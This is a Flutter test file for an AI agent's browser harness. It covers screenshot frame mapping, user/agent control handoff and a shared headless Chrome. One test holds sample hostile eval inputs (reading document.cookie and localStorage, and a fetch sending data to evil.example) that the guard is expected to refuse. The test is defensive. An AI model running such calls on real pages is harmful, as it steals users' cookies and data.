import 'dart:async';
import 'dart:io';

import 'package:every_ai/features/code/harness/everyai/browser_io.dart';
import 'package:every_ai/features/code/harness/everyai/screen_tools_io.dart';
import 'package:every_ai/features/code/live/frames.dart';
import 'package:every_ai/features/code/live/live_session.dart';
import 'package:flutter_test/flutter_test.dart';

void main() {
  group('frames', () {
    const g = ViewGeometry(1280, 800);
    test('points map from the picture the model saw, zooms included', () {
      final book = FrameBook();
      final whole = book.record(imageWidth: 640, imageHeight: 400, geometry: g);
      final p = book.map(whole.id, 100, 50, g);
      expect((p.x, p.y), (200.0, 100.0));
      final zoom = book.record(
        imageWidth: 400,
        imageHeight: 200,
        geometry: g,
        region: (left: 100, top: 100, width: 200, height: 100),
      );
      expect(zoom.zoomed, isTrue);
      final z = book.map(zoom.id, 200, 100, g);
      expect((z.x, z.y), (200.0, 150.0));
      // No id: the latest frame.
      expect(book.map(null, 200, 100, g).x, 200.0);
    });

    test('a resize refuses old frames; a scroll moves the point with the page; a navigation warns', () {
      final book = FrameBook();
      final f = book.record(imageWidth: 1280, imageHeight: 800, geometry: g);
      expect(book.map(f.id, 10, 10, const ViewGeometry(1440, 900)).refusal, contains('now 1440×900'));
      final scrolled = book.map(f.id, 10, 500, g, scrollY: 300);
      expect(scrolled.y, 200.0);
      expect(scrolled.warning, contains('moved with it'));
      expect(book.map(f.id, 10, 100, g, scrollY: 300).refusal, contains('scrolled out of view'));
      book.moved();
      final p = book.map(f.id, 10, 10, g);
      expect(p.refusal, isNull);
      expect(p.warning, contains('navigated'));
      expect(book.map('f_99', 1, 1, g).refusal, contains('no frame f_99'));
      expect(book.map(f.id, 2000, 1, g).refusal, contains('outside'));
    });

    test('pictures are shrunk to the model limit', () {
      expect(agentImageSize(1280, 800), (width: 1280, height: 800));
      expect(agentImageSize(1920, 1080), (width: 1568, height: 882));
      expect(agentImageSize(100, 50, scale: 2), (width: 200, height: 100));
    });
  });

  group('driving', () {
    test('agent actions wait while the user drives, and hear of Give back once', () async {
      final c = LiveControl(hold: const Duration(milliseconds: 200));
      expect(await c.agentTurn(), isTrue);
      c.take();
      expect(c.userDriving, isTrue);
      expect(await c.agentTurn(), isFalse);
      final waiting = c.agentTurn();
      c.giveBack();
      expect(await waiting, isTrue);
      expect(c.takeGiveBack(), isTrue);
      expect(c.takeGiveBack(), isFalse);
    });
  });

  test('eval may not read cookies or storage, nor send to other sites', () {
    expect(evalRefusal('document.cookie', 'http://localhost:3000/'), contains('cookies'));
    expect(evalRefusal('localStorage.getItem("t")', 'http://localhost:3000/'), contains('storage'));
    expect(evalRefusal('fetch("https://evil.example/x?d=1")', 'http://localhost:3000/'), contains('evil.example'));
    expect(evalRefusal('fetch("/api/items").then(r => r.status)', 'http://localhost:3000/'), isNull);
    expect(evalRefusal('fetch("http://localhost:3000/api")', 'http://localhost:3000/'), isNull);
    expect(evalRefusal('document.title', 'http://localhost:3000/'), isNull);
  });

  group('shared browser', () {
    final chrome = HeadlessBrowser.find();
    late Directory tmp;
    late HttpServer server;
    setUp(() async {
      tmp = Directory.systemTemp.createTempSync('live');
      server = await HttpServer.bind(InternetAddress.loopbackIPv4, 0);
      server.listen((req) {
        req.response
          ..headers.contentType = ContentType.html
          ..write('''<!doctype html><title>Shop</title><body style="margin:0">
<h1>Items</h1><button id=add onclick="document.title='added'">Add to cart</button>
<input aria-label="Search" value="tea"><input type=password aria-label="Password">
<a href="/next">Next page</a></body>''');
        unawaited(req.response.close());
      });
    });
    tearDown(() async {
      await server.close(force: true);
      await ChromeHost.of('${tmp.path}/profile').stop();
      tmp.deleteSync(recursive: true);
    });

    test('two sessions share one Chrome; refs click; frames and screencast work', () async {
      final a = HeadlessBrowser(profileDir: '${tmp.path}/profile');
      final b = HeadlessBrowser(profileDir: '${tmp.path}/profile');
      final url = 'http://127.0.0.1:${server.port}/';
      String fit(String t, String _) => t;
      final opened = await runBrowser(a, {'action': 'open', 'url': url}, root: tmp.path, vision: true, fit: fit);
      expect(opened.text, contains('button "Add to cart"'));
      expect(opened.text, contains('textbox "Search" value="tea"'));
      // A password field's value is never listed.
      expect(opened.text, isNot(contains('value="" (password')));
      expect(opened.text, contains('heading h1 "Items"'));
      final ref = RegExp(r'\[(ref_\d+)\] button').firstMatch(opened.text)!.group(1)!;
      final clicked = await runBrowser(a, {'action': 'click', 'ref': ref}, root: tmp.path, vision: true, fit: fit);
      expect(await a.evaluate('document.title'), 'added');
      expect(clicked.text, contains('button#add "Add to cart"'));
      expect(clicked.text, contains('The title is now "added"'));
      // The same element keeps its ref in the next list.
      final again = await runBrowser(a, {'action': 'snapshot'}, root: tmp.path, vision: true, fit: fit);
      expect(again.text, contains('[$ref] button "Add to cart"'));
      final missing = await runBrowser(a, {'action': 'click', 'ref': 'ref_99'}, root: tmp.path, vision: true, fit: fit);
      expect(missing.text, startsWith('Error: No element ref_99'));
      // The other session's page is its own.
      await b.open('about:blank');
      expect(await b.evaluate('document.title'), '');
      final shot = await runBrowser(a, {'action': 'screenshot'}, root: tmp.path, vision: true, fit: fit);
      expect(shot.text, contains('Frame f_1'));
      expect(shot.images, hasLength(1));
      final zoomed = await runBrowser(
        a,
        {'action': 'zoom', 'x': 0, 'y': 0, 'width': 200, 'height': 100, 'frame': 'f_1'},
        root: tmp.path,
        vision: true,
        fit: fit,
      );
      expect(zoomed.text, contains('Frame f_2: a zoom'));
      final frames = <ScreencastFrame>[];
      final sub = a.screencast.listen((f) {
        frames.add(f);
        a.ackFrame(f.session);
      });
      await a.startScreencast();
      await Future<void>.delayed(const Duration(milliseconds: 800));
      await a.stopScreencast();
      await sub.cancel();
      expect(frames, isNotEmpty);
      expect(frames.first.width, 1280);
      // The user types into the page directly (no guard: it is them).
      await a.userMouse('mousePressed', 5, 5, button: 'left', buttons: 1, clickCount: 1);
      await a.close();
      await b.close();
    }, skip: chrome == null ? 'no Chrome here' : null, timeout: const Timeout(Duration(minutes: 2)));
  });
}
